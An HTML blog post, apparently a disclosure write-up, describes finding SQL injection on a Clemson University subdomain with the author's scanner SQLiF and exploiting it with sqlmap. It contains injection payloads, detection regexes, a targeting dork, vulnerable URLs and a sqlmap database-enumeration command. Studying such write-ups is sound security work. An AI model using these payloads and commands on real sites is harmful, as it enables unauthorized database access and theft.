@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content=""
+  />
+  
+    
+      <title>Hacking Clemson University | Connor-Jay&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/blog/css/reset.css"/>
+  <link rel="stylesheet" href="/blog/css/font.css"/>
+  <link rel="stylesheet" href="/blog/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="https://connorjaydunn.github.io/blog/">
+      <img
+        class="icon"
+        src="/blog/images/brandIcon.png"
+      />
+    </a>
+    <div class="text">
+      <a href="https://connorjaydunn.github.io/blog/"><h1>Connor-Jay&#39;s Blog</h1></a>
+      <h3>a bored computer science student</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/blog/"><b>Home</b></a>
+      
+         | 
+        <a href="/blog/about/"><b>About</b></a>
+      
+         | 
+        <a href="/blog/posts/"><b>Posts</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">Hacking Clemson University</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2024-08-21</time>
+    
+    
+  </strong>
+  <span> • 1450 words</span>
+  <span> • 7 minute read</span>
+  
+  
+</div>
+
+      <div class="content"><p>This article details the steps I took to discover and exploit an SQL injection vulnerability on the <a href="https://www.clemson.edu/">Clemson University website</a> using my own tool, SQLiF (SQL injection Finder).</p>
+<h1 id="disclaimer">DISCLAIMER</h1>
+<p>This post and the release of my tool, SQLiF, are intended for <strong>educational purposes only</strong>. I was previously granted permission from Clemson University to document and share my findings with others. <strong>I am not responsible for anything you do with the information presented within this post</strong>.</p>
+<h1 id="what-is-an-sql-injection">What is an SQL injection?</h1>
+<p>If you&rsquo;re reading this blog, you&rsquo;re likely already familiar with SQL injection (SQLi), but let&rsquo;s briefly recap what it entails. SQL injection is a type of vulnerability that occurs when an attacker is able to manipulate SQL queries executed by a web application&rsquo;s database. This typically happens when user inputs are not properly sanitized and are directly incorporated into SQL queries.</p>
+<h2 id="a-simple-example">A Simple Example</h2>
+<p>Suppose a website has a login page that verifies user credentials by querying a database. For illustration, let’s assume the application uses an SQL query like this to check if a given username and password combination exists:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;user_input&#39;</span> <span style="color:#66d9ef">AND</span> password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pass_input&#39;</span>;
+</span></span></code></pre></div><p>In this query, &lsquo;user_name&rsquo; and &lsquo;pass_input&rsquo; represent the values entered by the user on the login page. Ideally, these inputs are safely handled and incorporated into the query. However, if the application doesn&rsquo;t properly handle/sanitize these inputs, then an attacker can perform an SQL injection.</p>
+<p>For example, if an attacker enters the following value for both the username and password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>The query executed by the web application transforms into:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#66d9ef">AND</span> password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>;
+</span></span></code></pre></div><p>The condition &lsquo;1&rsquo;=&lsquo;1&rsquo; is always true. Therefore, the query will return all rows from the &lsquo;users&rsquo; table, granting the attacker unauthorised access.</p>
+<p>There exist various types of SQL injections, each vary in terms of efficiency and methods of exploitation. The type discussed above is known as a Boolean-Based Blind SQL injection as it tests true or false statements to gather information. Other types, such as a Error-Based SQL injection cause the database management system (DBMS) to generate errors that leak information. Unfortunately, explaining all types in detail would divert from the main focus of this article. <a href="https://en.wikipedia.org/wiki/SQL_injection">For those interested in learning more about SQL injection.</a></p>
+<h1 id="sqlif-sql-injection-finder">SQLiF (SQL injection Finder)</h1>
+<p>SQLiF is a Python-based tool I wrote to automate the detection of SQL injection vulnerabilities in web applications. It not only scans specific target websites but also has the capability of finding vulnerabilities in different sites across the web.</p>
+<h2 id="how-sqlif-works">How SQLiF Works</h2>
+<p>Before moving onto the main topic of discussion, I am going to provide a brief overview of how SQLiF works. If you&rsquo;re not interested in understanding the internals of SQLiF, then <a href="#vulnerability-discovery--disclosure">click here</a> and you&rsquo;ll be redirected to the &ldquo;fun&rdquo; part of this blog.</p>
+<h2 id="error-based-sql-injection">Error-Based SQL Injection</h2>
+<p>Previously we spoke about Boolean-Based Blind SQL injection, and briefly touched upon Error-Based SQL injection. For the purpose of understanding how SQLiF works, we will be required to understand the methodology of this injection type in more depth.</p>
+<p>Unlike Boolean-Based Blind SQL injections, an Error-Based SQL injection leverages the errors produced by the web application&rsquo;s database management system. These errors can be invoked as to provide the attacker with information about the database structure, data, or other sensitive details.</p>
+<h2 id="example-of-an-error-based-sql-injection">Example of An Error-Based SQL Injection</h2>
+<p>Similar to before, suppose a website has a search function that retrieves information from a database based on user input. We can assume the website utilises the following SQL query in order to provide this functionality:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> product_id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;user_input&#39;</span>;
+</span></span></code></pre></div><p>And suppose the attacker inputs a payload designed to cause a syntax error, namely:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1234</span><span style="color:#e6db74">&#39; UNION SELECT NULL, NULL, @@version --
+</span></span></span></code></pre></div><p>The resulting SQL query executed by the web application is therefore:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> product_id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1234&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">NULL</span>, <span style="color:#66d9ef">NULL</span>, <span style="color:#f92672">@@</span><span style="color:#66d9ef">version</span> <span style="color:#75715e">--&#39;;
+</span></span></span></code></pre></div><p>Without delving into the SQL language too much, the now malicious SQL query above will likely invoke an error that includes information about the database; which in this case is the database version.</p>
+<p>Additionally, an attacker might obtain information about a database by checking whether errors occur for specific inputs. For instance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SQL</span> Error: [Microsoft][ODBC <span style="color:#66d9ef">SQL</span> Server Driver][<span style="color:#66d9ef">SQL</span> Server]Invalid <span style="color:#66d9ef">column</span> name <span style="color:#e6db74">&#39;password&#39;</span>.
+</span></span></code></pre></div><p>To an attacker, this message indicates that the column named &lsquo;password&rsquo; does not exist. Conversely, if no error had occurred, it would suggest that a column named &lsquo;password&rsquo; does exist. This information could then be used by the attacker in future queries to potentially access sensitive data, such as user passwords.</p>
+<h2 id="sqlifs-detection-mechanism">SQLiF&rsquo;s Detection Mechanism</h2>
+<p>Now we have a grasp on how Error-Based SQL injection works, we&rsquo;re ready to learn how SQLiF automates the process of finding SQL injections; a task that many will agree is mundane.</p>
+<p><strong>NOTE</strong>: As of the writing of this post (19/08/2024), SQLiF only features the detection of Error-Based SQL injections. Although this method of detection won&rsquo;t change, it is important to know that future updates may introduce detection vectors for other injection types (i.e. Time-Based SQL injection) hence the title and wording of this sub-section may sound rather strange.</p>
+<p>When a target web application is identified, SQLiF examines the page content for inputs that interact with the database. These inputs can be parameters in the URL or data submitted in the post body. SQLiF then sends requests to the database with SQL injection payloads (such as ‘ and “) appended to each parameter.</p>
+<p>Once the database responds, SQLiF analyses the web application’s response. The objective is to determine if Error-Based SQL Injection is possible by checking for errors triggered by the injected payloads. If errors are detected, it suggests that the database management system might be vulnerable. Below is the code used by SQLiF to carry out this process.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sql_errors <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;MySQL&#34;</span>: (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;SQL syntax.*MySQL&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Warning.*mysql_.*&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;MySQL Query fail.*&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;SQL syntax.*MariaDB server&#34;</span>
+</span></span><span style="display:flex;"><span>    ),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;PostgreSQL&#34;</span>: (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;PostgreSQL.*ERROR&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Warning.*\Wpg_.*&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Warning.*PostgreSQL&#34;</span>
+</span></span><span style="display:flex;"><span>    ),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Microsoft SQL Server&#34;</span>: (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;OLE DB.* SQL Server&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;(\W|\A)SQL Server.*Driver&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Warning.*odbc_.*&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Warning.*mssql_&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Msg \d+, Level \d+, State \d+&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Unclosed quotation mark after the character string&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Microsoft OLE DB Provider for ODBC Drivers&#34;</span>
+</span></span><span style="display:flex;"><span>    ),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Microsoft Access&#34;</span>: (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Microsoft Access Driver&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Access Database Engine&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Microsoft JET Database Engine&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;.*Syntax error.*query expression&#34;</span>
+</span></span><span style="display:flex;"><span>    ),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Oracle&#34;</span>: (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\bORA-[0-9][0-9][0-9][0-9]&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Oracle error&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Warning.*oci_.*&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Microsoft OLE DB Provider for Oracle&#34;</span>
+</span></span><span style="display:flex;"><span>    ),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;IBM DB2&#34;</span>: (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;CLI Driver.*DB2&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;DB2 SQL error&#34;</span>
+</span></span><span style="display:flex;"><span>    ),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;SQLite&#34;</span>: (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;SQLite/JDBCDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;System.Data.SQLite.SQLiteException&#34;</span>
+</span></span><span style="display:flex;"><span>    ),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Informix&#34;</span>: (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Warning.*ibase_.*&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;com.informix.jdbc&#34;</span>
+</span></span><span style="display:flex;"><span>    ),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sybase&#34;</span>: (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Warning.*sybase.*&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Sybase message&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">detect_dbms_error</span>(response):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Detects if a response contains any known DBMS error message(s).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Parameters:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        response (str): The response text to analyse for DBMS error message(s).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Returns:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bool: True if an DBMS error message was found, false otherwise.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> db, errors <span style="color:#f92672">in</span> sql_errors<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> error <span style="color:#f92672">in</span> errors:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>compile(error)<span style="color:#f92672">.</span>search(response):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span></code></pre></div><p>If an error is detected, SQLiF will simply log the important details to an output file. The user can then use this information in a tool such as <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> to exploit the vulnerability.</p>
+<p>This blog has only partly explained the internal operations of SQLiF for simplicity. If you&rsquo;re interested in learning more about SQLiF, or wish to use the tool yourself, <a href="https://github.com/connorjaydunn/SQLiF">then press here to visit the GitHub repo</a>.</p>
+<h1 id="vulnerability-discovery--disclosure">Vulnerability Discovery &amp; Disclosure</h1>
+<p>After identifying an SQL injection vulnerability on Clemson University’s website in June 2024 through manual testing, I decided to use SQLiF for a comprehensive scan to uncover any additional vulnerabilities.</p>
+<p>The command I input into SQLiF is shown below. This command directs SQLiF to scan up to 3 pages of search results. The scope of the scan is determined by the search operators specified within the query parameter. If you’re unfamiliar with this syntax, please refer to the SQLiF <a href="https://github.com/connorjaydunn/SQLiF#usage">usage section</a> for further information.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>...\sqlif.py -q <span style="color:#e6db74">&#34;site:grad360.sites.clemson.edu inurl:\&#34;</span>.php?\<span style="color:#e6db74">&#34; filetype:php&#34;</span> -p 3
+</span></span></code></pre></div><p>Executing said command, we receive the following output:</p>
+<p><img src="sqlif-output.png" alt=""></p>
+<p>The image above shows that SQLiF successfully identified six potential DBMS errors. Upon opening the output file, we are greeted with the potential injection points SQLiF identified:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>https://grad360.sites.clemson.edu/events/past-events.php?profs_id=1&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>https://grad360.sites.clemson.edu/events/past-events.php?profs_id=1<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>https://grad360.sites.clemson.edu/events/index.php?profs_id=4&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>https://grad360.sites.clemson.edu/events/index.php?profs_id=4<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>https://grad360.sites.clemson.edu/events/index.php?profs_id=1&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>https://grad360.sites.clemson.edu/events/index.php?profs_id=1<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>While these results don&rsquo;t guarantee that an Error-Based SQL injection is possible, they do offer a strong indication. As of writing this (19/08/2024), SQLiF does not currently have the capability to conduct further scans or exploit these injection points. Therefore, I used another tool called <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a>. Executing sqlmap with this command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>...\sqlmap.py -u <span style="color:#e6db74">&#34;https://grad360.sites.clemson.edu/events/past-events.php?profs_id=1&#34;</span> --dbs
+</span></span></code></pre></div><p>Yielded the following result:</p>
+<p><img src="sqlmap-output.png" alt=""></p>
+<p>Here we can see that sqlmap successfully managed to exploit the injection point and granted us access to Clemson University&rsquo;s database. For obvious reasons, I stopped poking around at that point and instead reported my findings to Clemson University via their <a href="mailto:ithelp@clemson.edu">email</a>.</p>
+<h1 id="timeline">Timeline</h1>
+<ul>
+<li>19/08/2024: Vulnerability Discovered</li>
+<li>19/08/2024: Vulnerability Disclosure</li>
+<li>28/08/2024: Vulnerability Fixed</li>
+</ul>
+</div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/connorjaydunn">GitHub</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2024
+    <a href="https://connorjaydunn.github.io/blog/"><strong>Connor-Jay</strong></a>.
+    This work is licensed under the
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> license.
+</footer>
+
+    </div>
+  </body>
+</html>
